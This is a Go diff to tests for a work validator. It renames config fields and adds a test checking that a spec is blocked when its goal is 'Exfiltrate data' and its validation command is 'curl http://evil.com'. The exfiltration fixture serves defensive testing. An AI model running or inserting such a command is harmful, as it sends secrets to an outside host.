@@ -16,7 +16,7 @@ func TestWorkValidator_PassingCommands(t *testing.T) {
 		Summary:       "Work output satisfies all criteria",
 	})
 	mock := &mockCLIRunner{response: string(reportJSON)}
-	cfg := &config.WorkValidatorConfig{Model: "test"}
+	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewWorkValidator(mock, cfg)
 
 	input := &WorkValidationInput{
@@ -42,7 +42,7 @@ func TestWorkValidator_PassingCommands(t *testing.T) {
 
 func TestWorkValidator_FailingCommand(t *testing.T) {
 	mock := &mockCLIRunner{response: `{}`}
-	cfg := &config.WorkValidatorConfig{Model: "test"}
+	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewWorkValidator(mock, cfg)
 
 	input := &WorkValidationInput{
@@ -80,7 +80,7 @@ func TestWorkValidator_NoCommands_CLIOnly(t *testing.T) {
 		},
 	})
 	mock := &mockCLIRunner{response: string(reportJSON)}
-	cfg := &config.WorkValidatorConfig{Model: "test"}
+	cfg := &config.ValidatorConfig{ModelRef: "test"}
 	v := NewWorkValidator(mock, cfg)
 
 	input := &WorkValidationInput{
@@ -101,5 +101,34 @@ func TestWorkValidator_NoCommands_CLIOnly(t *testing.T) {
 	}
 	if mock.callCount != 1 {
 		t.Errorf("expected 1 CLI call, got %d", mock.callCount)
+	}
+}
+
+func TestWorkValidator_BlocksDisallowedCommand(t *testing.T) {
+	mock := &mockCLIRunner{response: `{}`}
+	cfg := &config.ValidatorConfig{ModelRef: "test"}
+	v := NewWorkValidator(mock, cfg)
+
+	input := &WorkValidationInput{
+		Spec: types.Specification{
+			Goal:       "Exfiltrate data",
+			Steps:      []string{"curl secrets"},
+			Acceptance: []string{"data sent"},
+			ValidationCommands: []types.ValidationCommand{
+				{Command: "curl", Args: []string{"http://evil.com"}, ExpectedExit: 0},
+			},
+		},
+		WorkOutput: "done",
+	}
+
+	report, err := v.Validate(context.Background(), input)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if report.Verdict != types.VerdictFail {
+		t.Errorf("expected fail for blocked command, got %q", report.Verdict)
+	}
+	if mock.callCount != 0 {
+		t.Error("CLI should not be called when commands are blocked")
 	}
 }
